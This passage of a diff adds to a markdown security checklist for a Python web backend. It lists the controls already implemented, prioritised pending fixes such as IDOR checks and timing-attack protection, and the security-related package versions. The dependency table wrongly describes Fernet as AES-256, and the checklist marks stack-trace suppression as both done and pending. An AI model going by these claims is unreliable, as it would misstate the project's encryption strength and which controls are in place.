+| Transport | CORS origin whitelist |
+| Authentication | JWT access + refresh tokens with unique JTI |
+| Authentication | Persistent JWT blacklist (JSONL, SHA-256 hashed) |
+| Authentication | Per-IP rate limiting (60 req/min, 60-min block) |
+| Authentication | Per-username login rate limiting (5 attempts, 30-min lockout) |
+| Data at rest | AES-256 field-level encryption for all sensitive columns |
+| Data at rest | SHA-256 hash index for encrypted field lookups |
+| Data at rest | Argon2 password hashing |
+| Input validation | Pydantic schemas on all routes |
+| Input sanitisation | HTML stripping via `bleach` |
+| Error handling | Centralised `NoHarmException` — no stack traces leaked to clients |
+
+### Pending ⬜
+
+| Priority | Control | Section | Location |
+|----------|---------|---------|----------|
+| **Critical** | WebSocket JWT authentication | §6.1 | `socketManager.py` |
+| **Critical** | Service-layer ownership checks (IDOR prevention) | §5.2 | all `*Service.py` |
+| **Critical** | Stack trace removed from client error responses | §8.1 | all `*Repository.py`, `main.py` |
+| **Critical** | `.secrets.toml` added to `.gitignore` | §9.2 | `.gitignore` |
+| **Critical** | Verify secrets were never committed to Git | §9.2 | Git history audit |
+| **High** | Refresh token persistence in database | §7.4 | new `refreshTokenRepository.py`, `userService.py` |
+| **High** | Unified error message for login (account enumeration) | §7.1 | `authRoutes.py`, `userService.py` |
+| **High** | Redis-backed rate limiting (multi-worker) | §4.1, §8.2 | `rateLimiter.py` |
+| **High** | Constant-time login response (timing attack) | §1.2 | `authRoutes.py` |
+| **High** | Refresh token rotation (invalidate old on refresh) | §1.1 | `authRoutes.py` |
+| **High** | Per-endpoint rate limits | §4.1 | `middleware.py` |
+| **High** | Structured log sanitisation | §5.1 | logging setup |
+| **High** | Debug mode guard in production | §8.5 | `main.py`, `config.py` |
+| **High** | pip-audit in CI pipeline | §9.1 | `.github/workflows/` |
+| **Medium** | Email verification on registration | §7.2 | `userService.py`, `emailService.py` |
+| **Medium** | Secure password reset flow | §7.3 | `userService.py`, `emailService.py` |
+| **Medium** | Audit log integration in all services | §7.5 | all `*Service.py` |
+| **Medium** | Request body size limit (Uvicorn + Nginx) | §8.3 | `run.py`, Nginx config |
+| **Medium** | CAPTCHA after 3 login failures | §1.2 | `authRoutes.py` |
+| **Medium** | `extra='forbid'` on all input schemas | §2.3 | all `*Schemas.py` |
+| **Medium** | Nginx configuration (timeouts, body size, SSL) | §4.2 | infrastructure |
+| **Medium** | Encryption key versioning and rotation strategy | §8.4 | `encryption.py`, `config.py` |
+| **Medium** | File upload security (MIME validation, UUID rename, private bucket) | §8.7 | `storageService.py` |
+| **Low** | Account enumeration protection on register endpoint | §7.1 | `userService.py` |
+| **Low** | Host header injection protection | §8.6 | `config.py`, Nginx |
+| **Low** | Dependabot / automated dependency update PRs | §9.1 | `.github/` |
+| **Low** | 2FA / MFA | — | `authRoutes.py` |
+| **Low** | `pre-commit` hook to block secrets in commits | §9.2 | `.pre-commit-config.yaml` |
+
+---
+
+## Dependency Reference
+
+Security-critical packages and their purpose:
+
+| Package | Version | Purpose |
+|---------|---------|---------|
+| `PyJWT` | 2.8.0 | JWT encoding / decoding |
+| `argon2-cffi` | 23.1.0 | Password hashing (Argon2id) |
+| `cryptography` | 41.0.7 | AES-256 (Fernet) field encryption |
+| `bleach` | 6.1.0 | HTML sanitisation (XSS prevention) |
+| `passlib[bcrypt]` | 1.7.4 | bcrypt fallback if needed |
+| `python-jose[cryptography]` | 3.3.0 | Alternative JWT library (unused, available) |
+| `pydantic[email]` | 2.5.0 | Input validation and type enforcement |
+| `email-validator` | 2.1.0 | Email format validation |
